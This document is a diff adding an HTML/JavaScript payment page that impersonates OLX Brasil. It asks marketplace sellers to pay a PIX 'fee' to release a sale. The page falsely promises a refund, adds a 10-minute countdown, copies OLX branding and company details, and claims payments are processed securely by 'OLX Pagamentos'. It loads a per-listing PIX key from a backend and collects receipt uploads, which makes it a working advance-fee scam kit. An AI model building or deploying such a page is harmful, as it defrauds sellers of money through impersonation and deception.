@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Pagamento - OLX">
+    <title>Pagamento - OLX Brasil</title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="shortcut icon" href="/images/olx-favicon.ico" type="image/x-icon">
+     <script>
+        (function () {
+            if (document.cookie.indexOf("pagamentoFeito=true") !== -1) {
+                if (!window.location.pathname.endsWith('/pag/aprovado.html')) {
+                    window.location.href = '/pag/aprovado.html';
+                }
+            }
+        })();
+    </script>
+    
+    <style>
+        .pagamento-container {
+            max-width: 800px;
+            margin: 30px auto;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+        }
+
+        .pagamento-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .pagamento-title {
+            color: #6e0ad6;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .pagamento-subtitle {
+            color: #666;
+            font-size: 16px;
+        }
+
+        .pagamento-valor {
+            text-align: center;
+            background-color: #f1f8ff;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .pagamento-valor h3 {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .pagamento-valor .valor {
+            font-size: 28px;
+            font-weight: bold;
+            color: #6e0ad6;
+        }
+
+        .pagamento-pix {
+            text-align: center;
+            padding: 20px;
+        }
+
+        .pagamento-pix .qrcode-container {
+            margin: 20px auto;
+            max-width: 250px;
+            border: 1px solid #ddd;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .pagamento-pix img {
+            width: 100%;
+        }
+
+        .pagamento-pix .chave-pix {
+            background-color: #f1f8ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 16px;
+            border: 1px dashed #6e0ad6;
+        }
+
+        .btn-copiar {
+            background-color: #f5f5f5;
+            border: 1px solid #ddd;
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .btn-copiar:hover {
+            background-color: #ebebeb;
+        }
+
+        .pix-info {
+            font-size: 14px;
+            color: #666;
+            margin-top: 15px;
+        }
+
+        /* Estilo para chave PIX encurtada */
+        .chave-pix .chave-encurtada {
+            display: block;
+        }
+
+        .pagamento-info {
+            display: flex;
+            align-items: center;
+            margin-top: 25px;
+            padding: 10px;
+            background-color: #f8f9fa;
+            border-radius: 5px;
+        }
+
+        .pagamento-info i {
+            font-size: 24px;
+            color: #6e0ad6;
+            margin-right: 15px;
+        }
+
+        .pagamento-info p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .btn-confirmar {
+            background-color: #6e0ad6;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: bold;
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .btn-confirmar:hover {
+            background-color: #5a08b0;
+        }
+
+        .comprovante-section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .processando-pagamento {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .processando-pagamento i {
+            font-size: 36px;
+            color: #6e0ad6;
+            margin-bottom: 10px;
+        }
+
+        .processando-pagamento h2 {
+            color: #6e0ad6;
+            font-size: 24px;
+        }
+
+        .aviso-comprovante {
+            background-color: #fff7e6;
+            border: 1px solid #ffd699;
+            border-radius: 6px;
+            padding: 15px;
+        }
+
+        .aviso-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            color: #e65c00;
+        }
+
+        .aviso-header i {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
+        .aviso-header h3 {
+            font-size: 18px;
+            margin: 0;
+        }
+
+        .upload-area {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .upload-label {
+            display: block;
+            padding: 30px 20px;
+            border: 2px dashed #6e0ad6;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            background-color: #f8f4ff;
+            transition: background-color 0.3s;
+        }
+
+        .upload-label:hover {
+            background-color: #f0e6ff;
+        }
+
+        .upload-label i {
+            font-size: 40px;
+            color: #6e0ad6;
+            margin-bottom: 10px;
+        }
+
+        .upload-label span {
+            font-size: 18px;
+            font-weight: bold;
+            color: #6e0ad6;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .upload-label .small {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .arquivo-info {
+            margin: 15px 0;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .btn-enviar {
+            background-color: #6e0ad6;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .btn-enviar:hover:not([disabled]) {
+            background-color: #5a08b0;
+        }
+
+        .btn-enviar:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
+        }
+
+        .btn-whatsapp {
+            background-color: #25D366;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            width: 100%;
+        }
+
+        .btn-whatsapp i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .btn-whatsapp:hover {
+            background-color: #128C7E;
+        }
+
+        .instrucao-whatsapp {
+            background-color: #f0f8ff;
+            border: 1px solid #b8daff;
+            border-radius: 5px;
+            padding: 12px;
+            margin: 15px 0;
+            font-size: 14px;
+            color: #004085;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            display: none;
+        }
+
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #6e0ad6;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Estilos para o timer de pagamento */
+        .pagamento-timer {
+            text-align: center;
+            background-color: #fff7e6;
+            border-radius: 5px;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid #ffd699;
+        }
+
+        .pagamento-timer h3 {
+            font-size: 16px;
+            color: #e65c00;
+            margin-bottom: 8px;
+        }
+
+        .timer {
+            font-size: 28px;
+            font-weight: bold;
+            color: #e65c00;
+            font-family: monospace;
+        }
+
+        .timer-aviso {
+            color: #e65c00;
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .timer-expirado {
+            background-color: #ffe6e6;
+            border: 1px solid #ffb3b3;
+            color: #cc0000;
+            padding: 15px;
+            border-radius: 5px;
+            text-align: center;
+            margin: 20px 0;
+            display: none;
+        }
+
+        /* Estilo para o indicador de carregamento do QR Code */
+        .qrcode-loader {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .qrcode-loader i {
+            font-size: 40px;
+            color: #6e0ad6;
+            margin-bottom: 15px;
+        }
+
+        /* Estilos para o modal de aviso */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .modal-content {
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .modal-message {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .btn-prosseguir {
+            background-color: #F26825;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            font-weight: bold;
+        }
+
+        .btn-prosseguir:hover {
+            background-color: #d55a1e;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Modal de aviso -->
+    <div id="aviso-modal" class="modal-overlay">
+        <div class="modal-content">
+            <p class="modal-message">A taxa será reembolsada automaticamente após a entrega. O valor total será reservado em sua conta!</p>
+            <button id="btn-prosseguir" class="btn-prosseguir">Prosseguir</button>
+        </div>
+    </div>
+
+    <div class="app-container">
+        <div class="header-content">
+            <div class="logo">
+                <img src="/images/olx-logo.png" alt="Logo OLX">
+            </div>
+
+        </div>
+        <div class="main-content">
+            <div class="breadcrumb">
+                <a href="/">OLX</a> &gt; <a href="/vendas">Minhas Vendas</a> &gt; <span>Pagamento</span>
+            </div>
+            <div class="pagamento-container">
+                <div class="pagamento-header">
+                    <h1 class="pagamento-title">Pagamento de Recebimentos de Valores.</h1>
+                    <p class="pagamento-subtitle">Conclua o pagamento para liberar sua venda.</p>
+                </div>
+                <div class="pagamento-valor">
+                    <h3>Valor a pagar</h3>
+                    <div class="valor" id="valor-pagamento">Carregando...</div>
+                </div>
+
+                <!-- Timer de contagem regressiva -->
+                <div class="pagamento-timer">
+                    <h3>Tempo restante para pagamento</h3>
+                    <div class="timer" id="payment-timer">10:00</div>
+                    <p class="timer-aviso">Realize o pagamento antes que o tempo expire.</p>
+                </div>
+
+                <!-- Aviso de tempo expirado -->
+                <div class="timer-expirado" id="timer-expirado">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h3>Tempo para pagamento expirado</h3>
+                    <p>O tempo para pagamento expirou. Clique no botão abaixo para gerar uma nova chave PIX.</p>
+                    <button id="btn-renovar-pagamento" class="btn-confirmar">RENOVAR PAGAMENTO</button>
+                </div>
+
+                <div class="pagamento-pix">
+                    <p>Escaneie o QR code abaixo com o aplicativo do seu banco ou copie a chave PIX</p>
+                    <div class="qrcode-container" id="qrcode-container">
+                        <div class="qrcode-loader" id="qrcode-loader">
+                            <i class="fas fa-sync fa-spin"></i>
+                            <p>Gerando QR Code PIX...</p>
+                        </div>
+                        <img src="/images/pix-qrcode.png" alt="QR Code do PIX" id="qrcode-img" style="display: none;">
+                    </div>
+                    <p><strong>Ou use a chave PIX abaixo:</strong></p>
+                    <div class="chave-pix" id="chave-pix">Carregando chave PIX...</div>
+                    <div id="pagamento-link-container" style="display:none; margin-top: 10px;"></div>
+                    <button class="btn-copiar" id="btn-copiar-pix">
+                        <i class="far fa-copy"></i> Copiar Chave PIX
+                    </button>
+                    <p class="pix-info">O pagamento será confirmado automaticamente em até 5 minutos após a
+                        transferência.</p>
+                    <button id="btn-confirmar-pagamento" class="btn-confirmar">CONFIRMAR PAGAMENTO</button>
+                </div>
+                <div id="comprovante-section" class="comprovante-section" style="display: none;">
+                    <div class="processando-pagamento">
+                        <i class="fas fa-sync fa-spin"></i>
+                        <h2>PROCESSANDO PAGAMENTO</h2>
+                    </div>
+                    <div class="aviso-comprovante">
+                        <div class="aviso-header">
+                            <i class="fas fa-exclamation-triangle"></i>
+                            <h3>MENSAGEM DE ATENÇÃO: COMPROVANTE OBRIGATÓRIO</h3>
+                        </div>
+                        <p>Para ativar sua venda, é obrigatório enviar o comprovante de pagamento abaixo.</p>
+                        <p>Seu pagamento ainda não consta em nosso sistema. Para agilizar o processo, envie seu
+                            comprovante:</p>
+                        <div class="upload-area">
+                            <label for="comprovante-upload" class="upload-label">
+                                <i class="fas fa-file-upload"></i>
+                                <span>IMAGEM OU PDF</span>
+                                <p class="small">Clique para selecionar o arquivo</p>
+                            </label>
+                            <input type="file" id="comprovante-upload" accept=".jpg,.jpeg,.png,.pdf"
+                                style="display: none;">
+                            <p id="arquivo-selecionado" class="arquivo-info"></p>
+                            <button id="btn-enviar-comprovante" class="btn-enviar" disabled>ENVIAR COMPROVANTE</button>
+
+                            <div class="pagamento-info">
+                                <i class="fas fa-shield-alt"></i>
+                                <p>Seus dados de pagamento são protegidos com criptografia de ponta a ponta. Esta
+                                    transação é
+                                    100% segura e processada pela OLX Pagamentos.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <p>© 2023 OLX Brasil - Todos os direitos reservados</p>
+                    <p>CNPJ: 13.673.743/0002-55 - Avenida Paulista, 1000 - São Paulo/SP</p>
+                </div>
+            </div>
+            <div class="loading-overlay" id="loading-overlay">
+                <div class="loading-spinner"></div>
+                <p>Carregando...</p>
+            </div>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+            <script>
+                // Variável global para armazenar o preço
+                let precoConfig = "0,00"; // Valor padrão caso falhe o carregamento
+                
+                // Função para carregar o preço do config.json
+                function carregarPreco() {
+                    return fetch('/config.json')
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Não foi possível carregar o arquivo config.json');
+                            }
+                            return response.json();
+                        })
+                        .then(config => {
+                            if (config && config.preco) {
+                                // Formatar o preço para o padrão brasileiro (com vírgula)
+                                precoConfig = config.preco.replace('.', ',');
+                                
+                                // Atualizar o valor na interface
+                                document.getElementById('valor-pagamento').textContent = `R$ ${precoConfig}`;
+                                console.log('Preço carregado com sucesso:', precoConfig);
+                                return precoConfig;
+                            } else {
+                                throw new Error('Formato do config.json inválido');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Erro ao carregar o preço:', error);
+                            precoConfig = "242,00"; // Valor padrão em caso de erro
+                            document.getElementById('valor-pagamento').textContent = `R$ ${precoConfig}`;
+                            return precoConfig;
+                        });
+                }
+                
+                document.addEventListener('DOMContentLoaded', function () {
+                    // Carregar o preço do config.json
+                    carregarPreco();
+                    
+                    const btnCopiarPix = document.getElementById('btn-copiar-pix');
+                    const chavePix = document.getElementById('chave-pix');
+                    const pagamentoLinkContainer = document.getElementById('pagamento-link-container');
+                    const btnConfirmarPagamento = document.getElementById('btn-confirmar-pagamento');
+                    const comprovanteSection = document.getElementById('comprovante-section');
+                    const comprovanteUpload = document.getElementById('comprovante-upload');
+                    const arquivoSelecionado = document.getElementById('arquivo-selecionado');
+                    const btnEnviarComprovante = document.getElementById('btn-enviar-comprovante');
+                    const loadingOverlay = document.getElementById('loading-overlay');
+                    const qrcodeImg = document.getElementById('qrcode-img');
+                    const qrcodeContainer = document.getElementById('qrcode-container');
+                    const qrcodeLoader = document.getElementById('qrcode-loader');
+                    
+                    // Modal de aviso
+                    const avisoModal = document.getElementById('aviso-modal');
+                    const btnProsseguir = document.getElementById('btn-prosseguir');
+                    
+                    // Exibe o modal ao carregar a página
+                    avisoModal.style.display = 'flex';
+                    
+                    // Fecha o modal ao clicar no botão
+                    btnProsseguir.addEventListener('click', function() {
+                        avisoModal.style.display = 'none';
+                    });
+                    
+                    // Variável para armazenar a chave PIX completa
+                    let chavePixCompleta = '';
+
+                    // Função para encurtar a chave PIX na exibição
+                    function encurtarChavePix(chave) {
+                        if (chave.length <= 12) return chave; // Não encurta chaves curtas
+                        return `${chave.substring(0, 5)}...${chave.substring(chave.length - 5)}`;
+                    }
+                    
+                    // Configuração do timer de pagamento
+                    const paymentTimer = document.getElementById('payment-timer');
+                    const timerExpirado = document.getElementById('timer-expirado');
+                    let tempoRestante = 10 * 60; // 10 minutos em segundos
+                    let timerInterval;
+
+                    // Função para atualizar o timer
+                    function atualizarTimer() {
+                        const minutos = Math.floor(tempoRestante / 60);
+                        const segundos = tempoRestante % 60;
+                        paymentTimer.textContent = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+
+                        if (tempoRestante <= 0) {
+                            clearInterval(timerInterval);
+                            // Tempo expirado
+                            document.querySelector('.pagamento-pix').style.display = 'none';
+                            timerExpirado.style.display = 'block';
+                            paymentTimer.parentElement.style.display = 'none';
+                        }
+                        tempoRestante--;
+                    }
+
+                    // Não iniciar o timer aqui - será iniciado apenas após o QR Code ser gerado
+
+                    function limparQrGerado() {
+                        const qrGerado = document.getElementById('qrcode-gerado');
+                        if (qrGerado) {
+                            qrGerado.remove();
+                        }
+                    }
+
+                    // Botão para renovar o pagamento
+                    const btnRenovarPagamento = document.getElementById('btn-renovar-pagamento');
+                    if (btnRenovarPagamento) {
+                        btnRenovarPagamento.addEventListener('click', function() {
+                            // Restaurar exibição do QR Code
+                            qrcodeImg.style.display = 'none';
+                            qrcodeLoader.style.display = 'flex';
+                            chavePix.textContent = 'Carregando chave PIX...';
+                            
+                            // Recarregar informação de pagamento
+                            limparQrGerado();
+                            carregarPagamentoDaVenda();
+                            
+                            // Reiniciar o timer - isso será feito após o carregamento bem-sucedido do QR Code
+                            clearInterval(timerInterval);
+                            tempoRestante = 10 * 60; // Reiniciar para 10 minutos
+                            document.querySelector('.pagamento-pix').style.display = 'block';
+                            timerExpirado.style.display = 'none';
+                            paymentTimer.parentElement.style.display = 'block';
+                            // O timer será iniciado pela função carregarQRCodePix quando o QR Code for gerado
+                        });
+                    }
+
+                    // Carregar informações de pagamento da venda
+                    carregarPagamentoDaVenda();
+
+                    function carregarPagamentoDaVenda() {
+                        const params = new URLSearchParams(window.location.search);
+                        const vendaId = params.get('id');
+
+                        if (!vendaId) {
+                            exibirErroPagamento('Venda não informada.');
+                            return;
+                        }
+
+                        const vendaUrl = `/api/venda/${encodeURIComponent(vendaId)}?t=${Date.now()}`;
+
+                        fetch(vendaUrl, { cache: 'no-store' })
+                            .then(response => {
+                                if (!response.ok) {
+                                    throw new Error('Venda não encontrada');
+                                }
+                                return response.json();
+                            })
+                            .then(venda => {
+                                const pagamento = venda?.pagamento || '';
+                                const tipo = venda?.pagamentoTipo || 'texto';
+
+                                if (!pagamento) {
+                                    qrcodeLoader.style.display = 'none';
+                                    qrcodeImg.style.display = 'none';
+                                    chavePix.textContent = 'Envie o QR Code, link ou texto de pagamento durante o cadastro desta venda.';
+                                    btnCopiarPix.style.display = 'none';
+                                    pagamentoLinkContainer.style.display = 'none';
+                                    return;
+                                }
+
+                                qrcodeLoader.style.display = 'none';
+
+                                if (tipo === 'imagem') {
+                                    limparQrGerado();
+                                    qrcodeImg.src = pagamento;
+                                    qrcodeImg.style.display = 'block';
+                                    chavePix.textContent = 'QR Code de pagamento';
+                                    btnCopiarPix.style.display = 'none';
+                                } else {
+                                    qrcodeImg.style.display = 'none';
+                                    chavePixCompleta = pagamento;
+                                    chavePix.textContent = pagamento;
+                                    btnCopiarPix.style.display = 'inline-flex';
+
+                                    // Se vier um PIX copia-e-cola em texto, gera o QR automaticamente.
+                                    if (typeof QRCode !== 'undefined' && pagamento.length > 20) {
+                                        limparQrGerado();
+                                        const qrGerado = document.createElement('div');
+                                        qrGerado.id = 'qrcode-gerado';
+                                        qrcodeContainer.appendChild(qrGerado);
+                                        new QRCode(qrGerado, {
+                                            text: pagamento,
+                                            width: 220,
+                                            height: 220,
+                                        });
+                                    }
+
+                                    if (pagamentoLinkContainer) {
+                                        if (/^https?:\/\//i.test(pagamento)) {
+                                            pagamentoLinkContainer.innerHTML = `<a href="${pagamento}" target="_blank" rel="noopener">Abrir link de pagamento</a>`;
+                                            pagamentoLinkContainer.style.display = 'block';
+                                        } else {
+                                            pagamentoLinkContainer.style.display = 'none';
+                                        }
+                                    }
+                                }
+
+                                clearInterval(timerInterval);
+                                tempoRestante = 10 * 60;
+                                timerInterval = setInterval(atualizarTimer, 1000);
+                                atualizarTimer();
+                            })
+                            .catch(error => {
+                                console.error('Erro:', error);
+                                exibirErroPagamento('Não foi possível carregar a informação de pagamento.');
+                            });
+                    }
+
+                    function exibirErroPagamento(mensagem) {
+                        qrcodeLoader.innerHTML = `
+                            <i class="fas fa-exclamation-triangle" style="color: #e65c00;"></i>
+                            <p>${mensagem}</p>
+                        `;
+                        chavePix.textContent = 'Não foi possível carregar a informação de pagamento';
+                        btnCopiarPix.style.display = 'none';
+                        if (pagamentoLinkContainer) {
+                            pagamentoLinkContainer.style.display = 'none';
+                        }
+                    }
+
+                    // Botão para copiar a chave PIX
+                    btnCopiarPix.addEventListener('click', function () {
+                        const textArea = document.createElement('textarea');
+                        textArea.value = chavePixCompleta || chavePix.textContent;
+                        document.body.appendChild(textArea);
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+
+                        this.innerHTML = '<i class="fas fa-check"></i> Informação copiada!';
+                        setTimeout(() => {
+                            this.innerHTML = '<i class="far fa-copy"></i> Copiar informação';
+                        }, 2000);
+                    });
+        
+                    // Botão para confirmar pagamento
+                    btnConfirmarPagamento.addEventListener('click', function () {
+                        comprovanteSection.style.display = 'block';
+                        btnConfirmarPagamento.disabled = true;
+                        btnConfirmarPagamento.textContent = 'PAGAMENTO CONFIRMADO';
+
+                        // Scroll para a nova seção
+                        setTimeout(() => {
+                            comprovanteSection.scrollIntoView({ behavior: 'smooth' });
+                        }, 100);
+                    });
+
+                    // Gerenciar upload do arquivo
+                    comprovanteUpload.addEventListener('change', function () {
+                        if (this.files.length > 0) {
+                            const file = this.files[0];
+                            const fileSize = (file.size / 1024 / 1024).toFixed(2); // em MB
+
+                            if (fileSize > 10) {
+                                alert('O arquivo é muito grande. O tamanho máximo permitido é 10MB.');
+                                this.value = '';
+                                arquivoSelecionado.textContent = '';
+                                btnEnviarComprovante.disabled = true;
+                                return;
+                            }
+
+                            // Mostrar informações do arquivo selecionado
+                            arquivoSelecionado.textContent = `Arquivo selecionado: ${file.name} (${fileSize} MB)`;
+                            btnEnviarComprovante.disabled = false;
+                        } else {
+                            arquivoSelecionado.textContent = '';
+                            btnEnviarComprovante.disabled = true;
+                        }
+                    });
+
+                    // Função para salvar status de pagamento no cookie
+                    function setPagamentoFeito() {
+                        document.cookie = "pagamentoFeito=true; path=/; max-age=172800"; // 2 dias
+                    }
+
+                    // Botão para enviar comprovante
+                    btnEnviarComprovante.addEventListener('click', function () {
+                        if (!comprovanteUpload.files.length) {
+                            alert('Por favor, selecione um arquivo de comprovante primeiro.');
+                            return;
+                        }
+
+                        const file = comprovanteUpload.files[0];
+                        const formData = new FormData();
+                        formData.append('comprovante', file);
+                        formData.append('chavePix', chavePixCompleta || chavePix.textContent);
+                        formData.append('valor', precoConfig); // Usar o preço dinâmico
+
+                        // Mostrar overlay de carregamento
+                        loadingOverlay.style.display = 'flex';
+
+                        // Enviar o arquivo para o servidor
+                        fetch('/api/enviar-comprovante', {
+                            method: 'POST',
+                            body: formData
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                loadingOverlay.style.display = 'none';
+                                if (data.success) {
+                                    // Salva status de pagamento
+                                    setPagamentoFeito();
+                                    alert('Comprovante enviado com sucesso! Redirecionando para confirmação...');
+                                    btnEnviarComprovante.textContent = 'ENVIADO COM SUCESSO';
+                                    btnEnviarComprovante.style.backgroundColor = '#28a745';
+                                    btnEnviarComprovante.disabled = true;
+
+                                    // Redirecionar para a página de aprovação após 1.5 segundos
+                                    setTimeout(function () {
+                                        window.location.href = '/pag/aprovado.html';
+                                    }, 1500);
+                                } else {
+                                    throw new Error(data.message || 'Erro ao enviar comprovante');
+                                }
+                            })
+                            .catch(error => {
+                                loadingOverlay.style.display = 'none';
+                                alert(`Erro ao enviar comprovante: ${error.message}. Por favor, tente usar o WhatsApp.`);
+                                console.error('Erro:', error);
+                            });
+                    });
+
+                    // Botão para enviar comprovante pelo WhatsApp
+                    const btnWhatsapp = document.getElementById('btn-whatsapp');
+                    if (btnWhatsapp) {
+                        btnWhatsapp.addEventListener('click', function () {
+                        // Número para onde será enviado o WhatsApp
+                        const phoneNumber = '5511999999999';
+
+                        // Obter a chave PIX para referência
+                        const pixKey = chavePix.textContent;
+
+                        // Criar mensagem personalizada com dados do pagamento
+                        const message = `*COMPROVANTE DE PAGAMENTO*\n\n` +
+                            `*Chave PIX*: ${pixKey}\n` +
+                            `*Valor*: R$ ${precoConfig}\n\n` +
+                            `Estou enviando o comprovante de pagamento conforme solicitado.`;
+
+                        // Criar URL do WhatsApp com a mensagem predefinida
+                        const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+
+                        // Abrir o WhatsApp
+                        window.open(whatsappUrl, '_blank');
+                    });
+                    }
+                });
+            </script>
+</body>
+
+</html>
